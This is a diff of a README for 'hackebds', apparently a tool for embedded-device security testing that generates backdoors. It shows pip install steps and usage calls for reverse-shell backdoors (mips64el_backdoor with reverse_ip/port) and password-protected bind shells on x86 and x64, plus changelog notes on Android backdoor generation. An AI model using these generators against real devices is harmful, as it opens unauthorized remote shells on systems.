@@ -17,24 +17,23 @@ This tool is embedded in the security test of the device. There are two main fun
 ## install (1)  Highly recommended！！Because the source code compilation may not be updated in time，Please install the latest
 
 **pip install hackebds==0.1.5**
+
 **pip3 install -U hackebds**
 
 ```
 pip install hackebds==0.1.5
-....
 ```
 
 #### Instructions for use
 
 When importing this module will import the pwn module
-```
+
 Please install the corresponding binutils environment before use
 expample:
 ```
 apt search binutils | grep arm（You can replace it here）
 apt install binutils-arm-linux-gnueabi/hirsute
 ```
-
 1. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
 ```
@@ -50,7 +49,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>> mips64el_backdoor(reverse_ip,reverse_port)
 >>> x86_bind_shell(listen_port, passwd)
 >>> x64_bind_shell(listen_port, passwd)
-
+```
 
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
 ```
@@ -127,6 +126,7 @@ Qualcomm Snapdragon 660
  2022.6.27 0.1.0 Added Android backdoor generation
 
  2022.10.26 0.1.5 Fixed some problems and added some automatic generation functions of bindshell specified port passwords
+ 
 
 ## One-click build environment
 
